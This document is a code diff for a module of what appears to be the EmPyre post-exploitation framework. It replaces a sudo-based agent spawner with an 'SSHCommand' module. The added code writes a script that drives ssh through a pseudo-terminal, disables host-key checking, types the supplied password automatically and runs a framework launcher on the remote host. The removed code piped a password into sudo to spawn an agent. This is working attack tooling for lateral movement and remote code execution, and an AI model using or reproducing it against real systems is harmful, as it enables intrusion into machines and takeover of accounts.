@@ -1,19 +1,17 @@
 from lib.common import helpers
 
 class Module:
-
     def __init__(self, mainMenu, params=[]):
-
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'SudoSpawn',
+            'Name': 'SSHCommand',
 
             # list of one or more authors for the module
-            'Author': ['@harmj0y'],
+            'Author': ['Paul Mikesell', '@424f424f'],
 
             # more verbose multi-line description of the module
-            'Description': ('Spawns a new EmPyre agent using sudo.'),
+            'Description': 'This module will send an launcher via ssh.',
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -26,9 +24,11 @@ class Module:
 
             # True if the method doesn't touch disk/is reasonably opsec safe
             'OpsecSafe' : True,
-            
+
             # list of any references/other comments
-            'Comments': []
+            'Comments': [
+                'http://blog.clustrix.com/2012/01/31/scripting-ssh-with-python/'
+                            ]
         }
 
         # any options needed by the module, settable during runtime
@@ -36,15 +36,21 @@ class Module:
             # format:
             #   value_name : {description, required, default_value}
             'Agent' : {
-                'Description'   :   'Agent to execute module on.',
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Agent to use ssh from.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Login' : {
+                'Description'   :   'user@127.0.0.1',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Password' : {
-                'Description'   :   'User password for sudo.',
+                'Description'   :   'Password',
                 'Required'      :   True,
                 'Value'         :   ''
-            },    
+            },
             'Listener' : {
                 'Description'   :   'Listener to use.',
                 'Required'      :   True,
@@ -82,10 +88,9 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-
-        # extract all of our options
+        login = self.options['Login']['Value']
+        password = self.options['Password']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -98,18 +103,45 @@ class Module:
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-
+        launcher = launcher.replace("'", "\\'")
+        launcher = launcher.replace('"', '\\"')
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
-        else:
-            
-            password = self.options['Password']['Value']
+        script = """
 
-            launcher = launcher.replace('"','\\"')
-            launcher = launcher.replace('echo','')
-            parts = launcher.split("|")
-            launcher = "python -c %s" %(parts[0])
-            script = 'os.system("echo \\"%s\\" | sudo -S %s")' %(password, launcher)
+import os
+import pty
 
-            return script
+def wall(host, pw):
+    import os,pty
+    pid, fd = pty.fork()
+    if pid == 0: # Child
+        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
+        os._exit(1) # fail to execv
+
+    # read '..... password:', write password
+    os.read(fd, 1024)
+    os.write(fd, '\\n' + pw + '\\n')
+
+    result = []
+    while True:
+        try:
+            data = os.read(fd, 1024)
+            if data == "Password:":
+                os.write(fd, pw + '\\n')
+                
+        except OSError:
+            break
+        if not data:
+            break
+        result.append(data)
+    pid, status = os.waitpid(pid, 0)
+    return status, ''.join(result)
+
+status, output = wall('%s','%s')
+print status
+print output
+
+""" % (launcher, login, password)
+        return script
